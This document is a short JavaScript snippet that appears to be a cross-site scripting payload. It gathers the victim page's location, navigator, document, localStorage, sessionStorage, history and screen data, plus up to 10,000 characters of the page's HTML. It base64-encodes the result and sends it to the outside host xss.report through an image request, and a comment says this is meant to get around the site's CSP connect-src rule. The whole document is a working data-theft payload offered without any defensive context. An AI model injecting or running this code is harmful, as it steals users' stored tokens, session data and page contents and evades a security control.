(function() {
  let snapshot = {};
  let safeKeys = [
    'location', 'navigator', 'document', 'localStorage', 'sessionStorage',
    'name', 'history', 'innerWidth', 'innerHeight', 'screen', 'screenX',
    'screenY', 'outerWidth', 'outerHeight'
  ];

  for (let k of safeKeys) {
    try {
      snapshot[k] = window[k];
    } catch (e) {
      snapshot[k] = "Blocked or inaccessible";
    }
  }

  // DOM snapshot as separate key
  try {
    snapshot['html'] = document.documentElement.outerHTML.slice(0, 10000); // limit length
  } catch (e) {
    snapshot['html'] = "DOM snapshot failed";
  }

  // Send via image beacon (to bypass CSP connect-src)
  let img = new Image();
  img.src = "https://xss.report/snap?" + btoa(JSON.stringify(snapshot));
})();
